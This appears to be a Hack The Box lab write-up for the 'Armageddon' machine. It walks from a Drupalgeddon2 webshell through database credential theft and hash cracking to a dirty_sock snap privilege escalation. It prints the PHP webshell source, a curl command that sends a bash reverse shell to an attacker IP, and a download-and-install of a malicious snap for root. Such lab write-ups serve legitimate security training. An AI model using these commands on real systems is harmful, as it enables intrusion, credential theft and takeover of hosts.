---
title: 'Armageddon'
target: 'Hack The Box — Armageddon'
difficulty: 'easy'
date: 2025-12-25
summary: 'An HTB machine — CentOS host running Drupal 7.56 on Apache (80) and SSH (22). Exploited Drupalgeddon2 (CVE-2018-7600) for a webshell as apache, extracted MySQL credentials from settings.php, cracked brucetherealadmin''s Drupal hash to get SSH access, then escalated to root via sudo snap install with the dirty_sock payload.'
role: 'pentest'
tags: ['nmap', 'drupal', 'drupalgeddon2', 'searchsploit', 'webshell', 'php', 'reverse-shell', 'mysql', 'credential-recovery', 'hashcat', 'hash-cracking', 'ssh', 'sudo', 'snap', 'dirty-sock', 'privilege-escalation', 'linux']
problem: 'CentOS host running Drupal 7.56 vulnerable to Drupalgeddon2 (CVE-2018-7600) for unauthenticated RCE. MySQL credentials in settings.php expose a crackable admin hash reused for SSH. The user brucetherealadmin has sudo NOPASSWD on snap install, exploitable via dirty_sock for root.'
action: 'Nmap identified SSH (22) and HTTP (80) with Apache 2.4.6/Drupal 7 on CentOS. Confirmed Drupal 7.56 via CHANGELOG.txt. Ran the Drupalgeddon2 Ruby exploit to write a PHP webshell, upgraded to a reverse shell as apache. Extracted MySQL credentials from settings.php (drupaluser:CQHEy@9M*m23gBVj), dumped the users table to recover brucetherealadmin''s Drupal 7 hash, cracked it with hashcat/rockyou.txt to booboo. SSHed in as brucetherealadmin, found sudo NOPASSWD on snap install, deployed dirty_sock payload.snap to create a privileged user and escalated to root.'
outcome: 'Gained root through Drupalgeddon2 RCE to webshell, credential chain from settings.php to hash cracking to SSH, and dirty_sock snap exploit for privilege escalation.'
draft: false
---

## Background

Armageddon is an easy-rated Linux machine that chains a well-known CMS exploit with database credential extraction and a snap-based privilege escalation. The Drupal 7.56 installation is vulnerable to Drupalgeddon2 — one of the most impactful Drupal vulnerabilities ever disclosed — which provides unauthenticated remote code execution through the user registration form. From there, the path to root moves through three distinct credential boundaries: database credentials in a configuration file, a crackable password hash in the database, and sudo privileges on the snap package manager that enable a local privilege escalation through a crafted snap package.

---

## Enumeration

Running an **nmap** scan with service version detection and default scripts:

```
nmap -sV -sC -p- 10.10.10.233
```

![Terminal showing nmap scan results for 10.10.10.233. Two ports open — 22/tcp SSH OpenSSH 7.4 with RSA, ECDSA, and ED25519 host keys, and 80/tcp HTTP Apache httpd 2.4.6 CentOS with PHP/5.4.16. HTTP scripts show unknown favicon MD5, http-generator Drupal 7, supported methods GET HEAD POST OPTIONS, robots.txt with 36 disallowed entries including /includes/, /misc/, /modules/, /profiles/, /scripts/, /themes/, /CHANGELOG.txt, /cron.php, /admin/, /comment/reply/, /filter/tips/, /node/add/, /search/, /user/register/, /user/password/, /user/login/, /user/logout/, and clean URL variants. Server header Apache/2.4.6 (CentOS) PHP/5.4.16, page title Welcome to Armageddon.](/writeups/htb-armageddon/01-nmap-scan.png)

Two ports — **SSH on 22** with OpenSSH 7.4, and **HTTP on 80** with Apache 2.4.6 on CentOS running PHP 5.4.16. The nmap scripts pull out the critical details automatically: the `http-generator` tag identifies **Drupal 7**, `robots.txt` lists 36 disallowed entries including `/CHANGELOG.txt` and `/admin/`, and the page title reads "Welcome to Armageddon." With only two services exposed, the Drupal installation on port 80 is the clear entry point.

---

## Drupal 7.56 — identifying the version

Browsing to the target reveals the Drupal installation:

![Browser at 10.10.10.233 showing the Drupal-powered site with the armageddon logo featuring a chicken icon. Left sidebar shows a User login form with Username and Password fields, Create new account and Request new password links, and a Log in button. Main content area displays "Welcome to Armageddon" heading with "No front page content has been created yet" message. Home tab active in the navigation.](/writeups/htb-armageddon/02-drupal-login.png)

A default Drupal installation with no front page content — just the login form and the site branding. The login form and user registration are the primary attack surface for Drupal-specific vulnerabilities. Before testing credentials, confirming the exact version through the changelog:

![Browser at 10.10.10.233/CHANGELOG.txt showing the Drupal version history. First entry reads Drupal 7.56, 2017-06-21 with a fixed security issue SA-CORE-2017-003 (access bypass). Below it, the Drupal 7.55 2017-06-07 entry lists multiple fixes including PHP version incompatibility, automated test improvements, Let's Encrypt .htaccess support, mod_access_compat fixes, URL encoding for HTML5 validation, additional bug fixes, API documentation improvements, and automated test coverage.](/writeups/htb-armageddon/03-changelog.png)

**Drupal 7.56** — released June 21, 2017. This version is well within the range affected by Drupalgeddon2 (CVE-2018-7600), which impacts all Drupal versions before 7.58. The changelog even shows that the latest security fix applied was SA-CORE-2017-003, meaning the critical SA-CORE-2018-002 patch was never installed.

---

## Drupalgeddon2 — finding the exploit

Searching for known Drupal exploits with **SearchSploit**:

![Terminal showing searchsploit results for Drupal. Multiple entries listed including Drupal < 5.1 Post Comments RCE, Drupal < 5.22/6.16 Multiple Vulnerabilities, Drupal < 7.34 Denial of Service entries, Drupal < 7.58 Drupalgeddon3 Authenticated RCE variants, and the highlighted entry — Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 Drupalgeddon2 Remote Code Execution at php/webapps/44449.rb. Additional Drupalgeddon2 variants shown for Metasploit and PoC. Other entries include REST Module RCE, RESTful Web Services unserialize RCE, avatar_uploader Arbitrary File Disclosure, CKEditor XSS, CODER RCE, Cumulus tagcloud XSS, Drag and Drop Gallery upload, and Embedded Media Audio Flotsam vulnerabilities.](/writeups/htb-armageddon/04-searchsploit.png)

Multiple Drupalgeddon2 entries — the standalone Ruby exploit at `php/webapps/44449.rb` is the one to use. Drupalgeddon2 exploits a flaw in Drupal's Form API where the `#` character in form element keys isn't properly sanitized during rendering, allowing an attacker to inject executable PHP through the user registration form without any authentication.

---

## Exploitation — webshell as apache

Running the Drupalgeddon2 exploit against the target:

```
ruby arm.rb http://10.10.10.233
```

![Terminal showing Drupalgeddon2 exploit execution. Banner reads --==[::Drupalgeddon2::]==--. Target http://10.10.10.233/. Found CHANGELOG.txt (HTTP 200), Drupal v7.56. Testing Form (user/password) — Result Form valid. Testing Clean URLs — disabled (HTTP 404), not an issue for Drupal v7.x. Testing Code Execution (Method: name) — Payload echo SPXNYFWK, Result SPXNYFWK confirmed. "Good News Everyone! Target seems to be exploitable (Code execution)! w00hoo0!" Testing existing shell.php — HTTP 404, Size 5. Testing Writing To Web Root — base64-encoded payload decoded to PHP webshell <?php if(isset($_REQUEST['c'])) { system($_REQUEST['c'] . ' 2>&1'); } — "Very Good News Everyone! Wrote to the web root! Waayheeeey!!!" Fake PHP shell prompt with curl command. whoami returns apache.](/writeups/htb-armageddon/05-drupalgeddon2.png)

The exploit runs through a clean sequence — it confirms the Drupal version from CHANGELOG.txt, validates the registration form is accessible, tests code execution through the Form API name method, and then writes a PHP webshell to the web root. The webshell is delivered as a base64-encoded payload that decodes to a simple command execution shell. The final `whoami` confirms execution as the **apache** user.

Verifying the webshell's presence in the web root:

![Terminal showing the Drupalgeddon2 fake shell listing the web root with ls. Standard Drupal files visible — CHANGELOG.txt, COPYRIGHT.txt, INSTALL.mysql.txt, INSTALL.pgsql.txt, INSTALL.sqlite.txt, INSTALL.txt, LICENSE.txt, MAINTAINERS.txt, README.txt, UPGRADE.txt, authorize.php, cron.php, includes, index.php, install.php, misc, modules, profiles, robots.txt, scripts, shell.php, sites, themes, update.php, web.config, xmlrpc.php. Below, cat shell.php displays the webshell source — <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }.](/writeups/htb-armageddon/06-webshell.png)

The `shell.php` file sits alongside the standard Drupal files in the web root. The webshell is minimal — it takes a `c` parameter from the request and passes it directly to `system()` with stderr redirected to stdout. Simple, effective, and easy to use with curl.

---

## Reverse shell — upgrading from webshell

Using curl to verify command execution and then upgrading to a proper reverse shell:

```
curl http://10.10.10.233/shell.php -d 'c=id'
curl -G --data-urlencode "c=bash -i >& /dev/tcp/10.10.14.37/4444 0>&1" 'http://10.10.10.233/shell.php'
```

![Split terminal. Left side shows two curl commands — first curl http://10.10.10.233/shell.php -d 'c=id' returning uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0, then curl -G --data-urlencode "c=bash -i >& /dev/tcp/10.10.14.37/4444 0>&1" to the webshell URL. Right side shows nc -lvnp 4444 listener receiving a connection from 10.10.10.233 port 54346, "bash: no job control in this shell" message, and a bash-4.2$ prompt.](/writeups/htb-armageddon/07-reverse-shell.png)

The `id` output confirms execution as **apache** (uid 48) with an SELinux context of `httpd_t` — the web server is running under SELinux enforcement, which restricts what the apache process can access beyond the web directory. The reverse shell connects back through `/dev/tcp`, providing an interactive bash session. The SELinux context means certain lateral movement techniques won't work, but file reads within the web application's scope are unrestricted.

---

## Database credentials — settings.php

Drupal stores its database configuration in `sites/default/settings.php`. Reading the file from the reverse shell reveals the connection details:

![Terminal showing the Drupal $databases configuration array from settings.php. The default database connection contains database => 'drupal', username => 'drupaluser', password => 'CQHEy@9M*m23gBVj', host => 'localhost', port => '', driver => 'mysql', prefix => ''.](/writeups/htb-armageddon/08-settings-php.png)

Database **drupal** on localhost, accessed with **drupaluser** and password **CQHEy@9M\*m23gBVj** over the MySQL driver. These credentials provide direct access to the Drupal database where user account hashes are stored.

---

## Dumping the users table

Querying the Drupal users table with the recovered MySQL credentials:

```
mysql -e 'select * from users;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
```

![Terminal showing MySQL query output from the drupal users table. Three rows — row 0 with all NULL values, row 1 with uid 1 brucetherealadmin with Drupal 7 hash $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt email admin@armageddon.eu timezone Europe/London status 1 signature_format filtered_html created 1606998756 access 1607077194, and row 3 with user having hash $S$DI/7aSchX2PYZJQ8C0keqGcDF090BtpR/upDFG4JAmG6kOeGYL7i email user@armageddon.htb.](/writeups/htb-armageddon/09-mysql-dump.png)

Two real accounts in the database — **brucetherealadmin** (uid 1) with a Drupal 7 hash and email `admin@armageddon.eu`, and a **user** account (uid 3). The admin account is the target — uid 1 is the Drupal superuser created during installation, and the username suggests this is the system administrator.

Checking `/etc/passwd` to confirm the system accounts:

![Terminal showing cat /etc/passwd output with all system users. Standard CentOS accounts — root, bin, daemon, adm, lp, sync, shutdown, halt, mail, operator, games, ftp, nobody, systemd-network, dbus, polkitd, sshd, postfix, apache (uid 48), mysql (uid 27). The last entry shows brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash — the only real user account with a login shell.](/writeups/htb-armageddon/10-etc-passwd.png)

**brucetherealadmin** at uid 1000 with `/bin/bash` — the only real user account on the system. If the Drupal password cracks, it's worth testing for SSH credential reuse.

---

## Cracking the hash — hashcat

Running **hashcat** with the rockyou wordlist against the Drupal 7 hash:

```
hashcat -m 7900 hash.txt /usr/share/wordlists/rockyou.txt
```

![Terminal showing hashcat output. Session hashcat, Status Cracked, Hash.Name Drupal7, Hash.Target $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt. Guess.Base File /usr/share/wordlists/rockyou.txt, Guess.Queue 1/1 (100.00%). Speed 199 H/s at Accel 64 Loops 64. Recovered 1/1 (100.00%) Digests. Progress 1024/14344385 (0.01%). Candidates 123456 -> bethany. Started Sun Dec 19 05:29:00 2021, Stopped Sun Dec 19 05:30:42 2021. Below, cat cracked.txt shows the hash followed by :booboo — the cracked password.](/writeups/htb-armageddon/11-hashcat.png)

Cracked in under two minutes — the password is **booboo**. Drupal 7 uses a SHA-512 based iterated hashing scheme (indicated by the `$S$` prefix), which is deliberately slow at 199 H/s, but the password was simple enough to fall within the first thousand candidates in rockyou.txt. The cracked password opens the door to SSH as brucetherealadmin.

---

## Shell as brucetherealadmin

The Drupal password works for SSH — credential reuse from the web application database to the system account. After logging in, the user flag was retrieved from the home directory. Running `sudo -l` reveals the privilege escalation vector — brucetherealadmin can execute `/usr/bin/snap install` as root with no password.

The **snap** package manager on CentOS with sudo privileges is exploitable through the **dirty_sock** technique. Snap packages are self-contained application bundles, and the `--dangerous` flag allows installing unsigned packages while `--devmode` disables snap's security confinement. A malicious snap package can include an install hook that creates a new user with sudo privileges — the hook runs as root during installation.

Downloading the dirty_sock payload and installing it:

```
curl http://10.10.14.37/payload.snap -o payload.snap
sudo snap install /home/brucetherealadmin/payload.snap --dangerous --devmode
```

![Terminal showing brucetherealadmin@armageddon session. curl http://10.10.14.37/payload.snap -o payload.snap downloads 4096 bytes at 83591 speed. ls shows payload.snap and user.txt in the home directory. sudo snap install /home/brucetherealadmin/payload.snap --dangerous --devmode completes with "dirty-sock 0.1 installed" message.](/writeups/htb-armageddon/12-dirty-sock.png)

The malicious snap installs successfully as **dirty-sock 0.1** — the install hook has created a new user `dirty_sock` with sudo privileges and a known password.

---

## Root — dirty_sock escalation

Switching to the dirty_sock user and escalating to root:

![Terminal showing the escalation chain. su dirty_sock with password prompt. dirty_sock@armageddon shell obtained. sudo su triggers the trust lecture — "We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things: 1) Respect the privacy of others. 2) Think before you type. 3) With great power comes great responsibility." After entering the sudo password for dirty_sock, root shell obtained. cat /root/root.txt displays the flag 86a3e139bcfcb0e148e768698099b4b8.](/writeups/htb-armageddon/13-root-flag.png)

**Root** — `su dirty_sock` switches to the newly created user, and `sudo su` escalates to root. The trust lecture appearing confirms this is the first sudo invocation for the dirty_sock account. The root flag `86a3e139bcfcb0e148e768698099b4b8` was retrieved from `/root/root.txt`.

---

## What I took from this

Armageddon is a straightforward chain, but each link reinforces a different real-world pattern. Drupalgeddon2 is the entry point, and it's worth understanding why it was so devastating when it dropped — it's an unauthenticated RCE in the most popular enterprise CMS, exploitable through the user registration form that's enabled by default. The vulnerability exists in Drupal's Form API rendering pipeline, where array keys starting with `#` are treated as special properties. An attacker can inject a `#post_render` callback with arbitrary PHP code by manipulating form element names in a registration request. The fix was a single function (`RequestSanitizer::stripDangerousValues`) that strips these keys from user input, but every unpatched installation from 2018 onward was a sitting target.

The credential chain from settings.php to MySQL to SSH is a pattern that repeats across web application penetration tests. Drupal's settings.php is readable by the web server process by design — it needs the database credentials to function. Once you have code execution as the web server user, those credentials are always accessible. The reuse of brucetherealadmin's Drupal password for SSH is the human factor that turns a web application compromise into system access. Unique credentials per service would have contained the breach to the web application layer.

The dirty_sock privilege escalation through snap is a clean example of why package manager sudo privileges are dangerous. The `snap install` command with `--dangerous --devmode` flags bypasses both signature verification and security confinement, allowing a crafted snap package to execute arbitrary code as root during installation. The snap package format includes install hooks — scripts that run with root privileges when the package is installed — and without signature verification, there's nothing preventing a malicious hook from creating backdoor accounts. The defense is straightforward: don't grant sudo access to package managers, or at minimum restrict it to specific trusted packages rather than allowing arbitrary installations.
